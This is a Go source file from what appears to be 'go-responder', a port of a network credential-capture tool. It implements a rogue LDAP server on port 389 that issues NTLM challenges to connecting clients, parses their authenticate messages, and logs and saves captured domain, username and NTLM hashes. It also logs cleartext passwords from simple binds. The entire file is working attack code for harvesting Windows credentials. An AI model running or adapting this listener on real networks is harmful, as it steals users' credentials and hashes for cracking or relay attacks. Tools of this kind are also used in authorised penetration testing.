package server

import (
	"encoding/binary"
	"fmt"
	"net"
	"time"

	"go-responder/internal/core"
)

func ServeLDAP(ifaceIP net.IP) {
	ln, err := net.Listen("tcp4", fmt.Sprintf("%s:389", ifaceIP))
	if err != nil {
		core.LogError("LDAP listen :389 - %v (need root?)", err)
		return
	}
	core.LogInfo("LDAP listening on %s:389", ifaceIP)
	for {
		c, err := ln.Accept()
		if err != nil {
			continue
		}
		go HandleLDAP(c)
	}
}

func HandleLDAP(c net.Conn) {
	defer c.Close()
	c.SetDeadline(time.Now().Add(30 * time.Second))

	challenge := core.GetChallenge()
	var msgID int

	buf := make([]byte, 8192)
	for {
		n, err := c.Read(buf)
		if err != nil || n == 0 {
			return
		}
		pkt := buf[:n]

		if len(pkt) < 2 || pkt[0] != 0x30 {
			return
		}

		inner, ok := berInner(pkt)
		if !ok {
			return
		}

		if len(inner) < 3 || inner[0] != 0x02 {
			return
		}
		idLen := int(inner[1])
		if idLen > 4 || 2+idLen > len(inner) {
			return
		}
		for i := 0; i < idLen; i++ {
			msgID = (msgID << 8) | int(inner[2+i])
		}
		inner = inner[2+idLen:]

		if len(inner) < 2 || inner[0] != 0x60 {
			continue
		}
		bindBody, ok := berInner(inner)
		if !ok {
			return
		}

		if len(bindBody) < 3 || bindBody[0] != 0x02 {
			return
		}
		verLen := int(bindBody[1])
		bindBody = bindBody[2+verLen:]

		if len(bindBody) < 2 || bindBody[0] != 0x04 {
			return
		}
		nameLen := int(bindBody[1])
		bindBody = bindBody[2+nameLen:]

		if len(bindBody) < 2 {
			return
		}
		authTag := bindBody[0]

		if authTag == 0xa3 {
			saslBody, ok := berInner(bindBody)
			if !ok {
				return
			}
			if len(saslBody) < 2 || saslBody[0] != 0x04 {
				return
			}
			mechLen := int(saslBody[1])
			mech := string(saslBody[2 : 2+mechLen])
			saslBody = saslBody[2+mechLen:]

			if mech != "GSS-SPNEGO" && mech != "NTLM" && mech != "GSSAPI" {
				core.LogVerbose("LDAP unknown SASL mechanism: %s", mech)
				return
			}

			if len(saslBody) < 2 || saslBody[0] != 0x04 {
				return
			}
			credLen := berReadLen(saslBody[1:])
			credOff := 1 + berLenBytes(credLen)
			if credOff+credLen > len(saslBody) {
				return
			}
			creds := saslBody[credOff : credOff+credLen]

			ntlm := core.FindNTLMSSP(creds)
			if len(ntlm) < 12 {
				return
			}
			msgType := binary.LittleEndian.Uint32(ntlm[8:12])

			switch msgType {
			case 1:
				ntlmChallenge := core.BuildNTLMChallenge(challenge, core.SessionDomain, core.SessionMachineName)
				spnego := core.WrapSPNEGOChallenge(ntlmChallenge)
				resp := ldapBindResponse(msgID, 14, spnego)
				c.Write(resp)
				core.LogVerbose("LDAP NTLM Type1 from %s - issuing challenge", c.RemoteAddr())

			case 3:
				hash, user, domain, ntlmVer, err := core.ParseNTLMAuthenticate(ntlm, challenge)
				if err != nil {
					core.LogVerbose("LDAP NTLM parse: %v", err)
					return
				}
				core.LogSuccess("[LDAP] %s captured from %s", ntlmVer, c.RemoteAddr())
				core.LogSuccess("       %s\\%s", domain, user)
				core.LogSuccess("       %s", hash)
				core.SaveHash(hash)
				resp := ldapBindResponse(msgID, 49, nil)
				c.Write(resp)
				return
			}

		} else if authTag == 0x80 {
			simpleLen := berReadLen(bindBody[1:])
			simpleOff := 1 + berLenBytes(simpleLen)
			if simpleOff+simpleLen > len(bindBody) {
				return
			}
			pass := string(bindBody[simpleOff : simpleOff+simpleLen])
			if pass != "" {
				core.LogSuccess("[LDAP] Cleartext bind from %s: password=%q", c.RemoteAddr(), pass)
			}
			resp := ldapBindResponse(msgID, 49, nil)
			c.Write(resp)
			return
		}
	}
}

func ldapBindResponse(msgID int, resultCode int, serverSaslCreds []byte) []byte {
	var body []byte
	body = append(body, berTag(0x0a, []byte{byte(resultCode)})...)
	body = append(body, 0x04, 0x00)
	body = append(body, 0x04, 0x00)
	if serverSaslCreds != nil {
		body = append(body, berTag(0x87, serverSaslCreds)...)
	}
	bindResp := berTag(0x61, body)

	var msgIDBuf [4]byte
	binary.BigEndian.PutUint32(msgIDBuf[:], uint32(msgID))
	msgIDBytes := msgIDBuf[:]
	for len(msgIDBytes) > 1 && msgIDBytes[0] == 0 {
		msgIDBytes = msgIDBytes[1:]
	}
	msgIDField := berTag(0x02, msgIDBytes)

	msg := append(msgIDField, bindResp...)
	return berTag(0x30, msg)
}

func berTag(tag byte, data []byte) []byte {
	out := []byte{tag}
	l := len(data)
	switch {
	case l < 0x80:
		out = append(out, byte(l))
	case l < 0x100:
		out = append(out, 0x81, byte(l))
	case l < 0x10000:
		out = append(out, 0x82, byte(l>>8), byte(l))
	}
	return append(out, data...)
}

func berInner(data []byte) ([]byte, bool) {
	if len(data) < 2 {
		return nil, false
	}
	l := berReadLen(data[1:])
	lb := berLenBytes(l)
	if 1+lb+l > len(data) {
		return nil, false
	}
	return data[1+lb : 1+lb+l], true
}

func berReadLen(data []byte) int {
	if len(data) == 0 {
		return 0
	}
	if data[0] < 0x80 {
		return int(data[0])
	}
	n := int(data[0] & 0x7f)
	l := 0
	for i := 1; i <= n && i < len(data); i++ {
		l = (l << 8) | int(data[i])
	}
	return l
}

func berLenBytes(l int) int {
	switch {
	case l < 0x80:
		return 1
	case l < 0x100:
		return 2
	default:
		return 3
	}
}
